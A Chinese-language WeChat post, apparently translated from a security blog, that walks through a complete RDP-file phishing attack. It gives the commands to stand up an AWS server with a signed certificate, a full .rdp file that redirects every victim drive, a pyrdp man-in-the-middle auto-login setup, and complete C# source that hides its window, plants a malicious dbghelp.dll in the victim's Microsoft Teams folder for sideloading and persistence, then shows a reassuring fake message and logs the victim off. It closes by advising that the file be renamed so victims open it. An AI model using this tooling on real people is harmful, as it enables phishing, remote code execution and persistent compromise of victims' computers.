#  通过 RDP 文件钓鱼

[ RowTeam ](javascript:void\(0\);)

**RowTeam** ![]()

微信号 RowTeam

功能介绍 没有什么好介绍的消遣地

____

___发表于_

收录于合集

> 原文：https://shorsec.io/blog/malrdp-implementing-rouge-rdp-manually/

## 0x00 前言

这起码对于我来说是新鲜玩意、文中可概括为几个部分：

  1. 1. 服务器的基础配置

  2. 2. RDP 文件的制作，这个比较费时间

  3. 3. 共享盘的利用

  4. 4. 钓鱼文案

## 0x01 基础设施

首先，我们需要在云供应商中创建一台 Windows 服务器，这里我使用了 AWS 的 EC2 实例 Windows Server 2022 机器。

![]()

请务必为此 EC2 实例设置密钥对，否则将无法检索此实例的密码：

![]()

应该只允许来自互联网的端口 443 和 80 入站（当然还有绑定到 IP 的 3389，以便可以连接到服务器并对其进行配置）：

![]()

EC2 实例完成初始化后，单击连接，然后单击解密密码，上传您的私有密钥，最后显示 EC2 计算机的密码（用户名是 administrator）：

![]()image.png

现在我们可以通过 RDP 连接到我们的机器并开始配置：

![]()image.png

## 0x02 初始配置

首先要做的是在我们的机器上安装 WSL（Linux 的 Windows 子系统）。在安装了 Windows Server 2022 的 EC2
上，我们只需打开 PowerShell 并输入以下命令，然后重新启动我们的 EC2 实例：

    
    
    wsl --install --enable-wsl1

![]()image.png

重新启动 EC2 实例后，运行以下命令：

    
    
    wsl --set-default-version 1

现在 WSL 安装已完成，单击 SHIFT+右键单击桌面上的任意位置，然后单击在此处打开 Linux Shell：

![]()image.png

在 WSL shell 中，我们需要安装 python3、certbot 和 git：

    
    
    apt update  
    apt install python3 python3-pip git libaugeas0  
    pip install certbot

![]()image.png

现在让我们设置我们的 DNS 记录并为其获取 SSL 证书。

为自己获取一个域名，只需创建一个 A 记录并将其指向 EC2 实例：

![]()image.png

现在，我们可以使用 certbot 为我们的域名获取 Let's Encrypt SSL 证书--我们将用它来签署最终的 RDP
文件，为我们的钓鱼网站增加一点合法性。 注意：确保 AWS 上的安全组允许来自互联网的入站 http（端口 80）（这是 certbot
确认拥有域的方式），并关闭 EC2 实例上的 Windows 防火墙：

![]()image.png

现在，在 WSL 外壳中运行以下命令，从 Certbot 获取证书：

    
    
    certbot certonly --cert-name malrdp -d <your.domain.com> --register-unsafely-without-email

![]()image.png

私钥和公钥将保存在 /etc/letsencrypt/live/YOUR_CERT_NAME/ 的 WSL 文件系统中。现在让我们使用 openssl
将它们转换为 pfx 格式

    
    
    openssl pkcs12 -inkey /etc/letsencrypt/live/malrdp/privkey.pem -in /etc/letsencrypt/live/malrdp/fullchain.pem -export -out malrdp.pfx

![]()image.png

下一步是在我们的 Windows 证书存储中安装此证书，你可以通过右键单击 pfx 文件并单击安装 PFX 并按照向导中的说明进行操作来执行此操作。

现在我们已经安装了证书，我们需要获取它的指纹，以便用它来签署我们的 RDP 文件（我们的钓鱼文件），我们稍后将创建该文件。要获取我们的证书指纹，我们可以使用
certmgr.msc -> 个人 -> 证书 ->双击我们的证书 -> 详细信息 -> 指纹。复制证书的指纹，因为我们在下一步中需要用到它。

![]()image.png

现在，我们已准备好创建将用作网络钓鱼的 RDP 文件。打开记事本并创建名为 malrdp.rdp
的新文件，将以下内容复制到其中，确保更改完整地址字段中的域名，但将端口保留为443，然后保存 RDP 文件：

    
    
    screen mode id:i:1  
    use multimon:i:0  
    desktopwidth:i:1920  
    desktopheight:i:1080  
    session bpp:i:32  
    winposstr:s:0,1,1904,23,3840,1142  
    compression:i:1  
    keyboardhook:i:2  
    audiocapturemode:i:0  
    videoplaybackmode:i:1  
    connection type:i:7  
    networkautodetect:i:1  
    bandwidthautodetect:i:1  
    displayconnectionbar:i:1  
    enableworkspacereconnect:i:0  
    disable wallpaper:i:0  
    allow font smoothing:i:0  
    allow desktop composition:i:0  
    disable full window drag:i:1  
    disable menu anims:i:1  
    disable themes:i:0  
    disable cursor setting:i:0  
    bitmapcachepersistenable:i:1  
    full address:s:<YOUR.DOMAIN.COM>:443  
    audiomode:i:0  
    redirectprinters:i:1  
    redirectcomports:i:0  
    redirectsmartcards:i:1  
    redirectwebauthn:i:1  
    redirectclipboard:i:1  
    redirectposdevices:i:0  
    autoreconnection enabled:i:1  
    authentication level:i:2  
    prompt for credentials:i:0  
    negotiate security layer:i:1  
    remoteapplicationmode:i:0  
    alternate shell:s:  
    shell working directory:s:  
    gatewayhostname:s:  
    gatewayusagemethod:i:4  
    gatewaycredentialssource:i:4  
    gatewayprofileusagemethod:i:0  
    promptcredentialonce:i:0  
    gatewaybrokeringtype:i:0  
    use redirection server name:i:0  
    rdgiskdcproxy:i:0  
    kdcproxyname:s:  
    enablerdsaadauth:i:0  
    redirectlocation:i:0  
    drivestoredirect:s:*

![]()image.png

现在，让我们对此 RDP 文件进行签名。在 PowerShell 中，输入以下命令对 RDP 文件进行签名：

    
    
    rdpsign.exe /sha256 YOUR_CERTIFICATE_THUMBPRINT .\malrdp.rdp

![]()image.png

如果现在打开 RDP 文件，则会看到它确实已签名：

![]()image.png

现在，让我们创建一个新用户供受害者连接：

    
    
    net user tsuser StrongP@ssw0rd /add  
    net localgroup administrators tsuser /add

![]()

为了使 RDP 文件自动连接，而无需受害者输入用户和密码，我们将使用 pyrdp 作为 RDP 的代理以及自动登录。再次打开 WSL
外壳，并使用以下命令下载并安装 pyrdp：

    
    
    cd /opt/  
    git clone https://github.com/GoSecure/pyrdp.git  
    cd pyrdp/  
    pip install .

![]()

在运行 pyrdp 之前，我们必须确保 NLA 已针对我们的 Windows EC2 关闭。我们可以通过打开 Windows
设置->远程桌面->高级设置->确保取消选中要求计算机使用网络级别身份验证进行连接：

![]()

现在我们准备好使用以下命令运行 Pyrdp（确保使用证书公钥和私钥，以便受害者不会收到任何 SSL 警告：

    
    
    pyrdp-mitm.py 127.0.0.1:3389 -u tsuser -p StrongP@ssw0rd --listen 443 -c /etc/letsencrypt/live/malrdp/fullchain.pem -k /etc/letsencrypt/live/malrdp/privkey.pem

如果你现在尝试使用 malrdp.rdp 钓鱼，则不会看到 SSL 警告，并且连接将在不需要受害者凭据的情况下通过：

![]()

还会注意到 RDP 会话可以访问受害者的主机文件系统：

![]()image.png

现在我们已经准备好进入有趣的部分了...

## 0x03 武器化

目前，我们只有一个 RDP 文件，该文件无需凭据即可自动连接到我们的服务器，并将受害者的主机文件系统暴露给我们的服务器。现在我们需要利用这种级别的访问。

有几种方法可以做到这一点，但为了保持简单，我们将使用一个人为的场景，我们将在受害者的主机文件系统中植入一个 DLL，特别是 Microsoft Teams
AppData 文件夹，每次受害者运行 Microsoft Teams 时都会侧加载。

至于其他漏洞利用场景，我鼓励你发挥你的想象力🙂。

我创建了一个简单的 C# 程序，我称之为 MalRDP，该程序在运行时将连接到受害者的主机文件系统（特别是 C 驱动器）并查找它有权访问的任何
Microsoft Teams AppData 文件夹，并将侧加载 DLL 复制到名为 dbghelp.dll 的 Teams 文件夹。

这将确保下次 Microsoft Teams 运行时，它将加载我们植入受害者文件系统中的恶意
DLL，并且我们在受害者的机器上获得代码执行（如果你考虑的话，还可以获得持久性）！

DLL 植入过程完成后，MalRDP 会让用户知道他将与服务器断开连接（根据网络钓鱼借口），然后断开受害者的连接，以防止他窥探我们的 RDP
服务器并允许下一个受害者也陷入此网络钓鱼。

我可能会扩展 MalRDP 以允许模块化配置，但这只是现在的 POC，我也想等待 Mike 的 Rouge
RDP，这无疑比我想出的任何东西都要好，所以再次，请留意 Rouge RDP 的发布（我知道我是......

以下是 MalRDP 的代码：

    
    
    using System;  
    using System.Collections.Generic;  
    using System.IO;  
    using System.Linq;  
    using System.Runtime.InteropServices;  
    using System.Windows.Forms;  
      
    namespace MalRDP  
    {  
        class Program  
        {  
            [DllImport("wtsapi32.dll", SetLastError = true)]  
            static extern bool WTSLogoffSession(IntPtr hServer, int sessionId, bool bWait);  
      
            [DllImport("kernel32.dll")]  
            static extern IntPtr GetConsoleWindow();  
      
            [DllImport("user32.dll")]  
            static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);  
      
            const int SW_HIDE = 0;  
            const int WTS_CURRENT_SESSION = -1;  
            static readonly IntPtr WTS_CURRENT_SERVER_HANDLE = IntPtr.Zero;  
      
            static void Main(string[] args)  
            {  
                var handle = GetConsoleWindow();  
                ShowWindow(handle, SW_HIDE);  
      
                try  
                {  
                    List<string> user_directories = Directory.GetDirectories(@"\\tsclient\C\Users\").ToList();  
                    foreach (string dir in user_directories)  
                    {  
                        try  
                        {  
                            if (dir.EndsWith("Default") || dir.EndsWith("Default User") || dir.EndsWith("Public") || dir.EndsWith("All Users"))  
                                continue;  
      
                            string userTeamsFolder = $@"{dir}\AppData\Local\Microsoft\Teams\current";  
                            if (Directory.Exists(userTeamsFolder))  
                            {  
                                File.Copy(@"C:\Netlogon\mal.dll", $@"{userTeamsFolder}\dbghelp.dll");  
                                break;  
                            }  
                                  
                        }  
                        catch { }  
                    }  
                }  
                catch { }  
      
                MessageBox.Show("Your remote access have been verified.\nThank you for your cooperation.\nNo further action is needed.");  
                WTSLogoffSession(WTS_CURRENT_SERVER_HANDLE, WTS_CURRENT_SESSION, false);  
            }  
        }  
    }

因此，为了配置武器化过程，我编译了 MalRDP 和恶意 DLL，它将植入并将它们复制到我在 C:\Netlogon 创建的文件夹中的 EC2
服务器。我还创建了一个可以简单地运行 MalRDP.exe 的 bat 文件并将其称为 tsuser.bat

![]()image.png

现在我们需要将 tsuser.bat 设置为 tsuser 的登录脚本。通过这样做，我们确保每次受害者连接到我们的 RDP 服务器时都会运行
MalRDP。我们可以通过打开计算机管理 -> 系统工具 -> 本地用户和组 -> 用户 ->双击 tsuser -> 配置文件
->将登录脚本字段设置为“tsuser.bat”来设置它。

![]()image.png

最后要做的是共享 C:\Netlogon 文件夹，并确保“每个人都”组对其具有读取访问权限。右键单击 Netlogon 文件夹 -> 属性 -> 共享 ->
高级共享 ->选中“共享此文件夹”-> 权限 -> 确保“每个人”组具有读取访问权限。

![]()image.png

## 0x04 钓钓鱼

就是这样，我们准备将 malrdp.rdp 文件发送给我们的受害者 - 只要记住重命名它，我认为任何受害者都不会点击名为 malrdp.rdp 的文件。

并且不要忘记启动 pyrdp...

  

预览时标签不可点

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

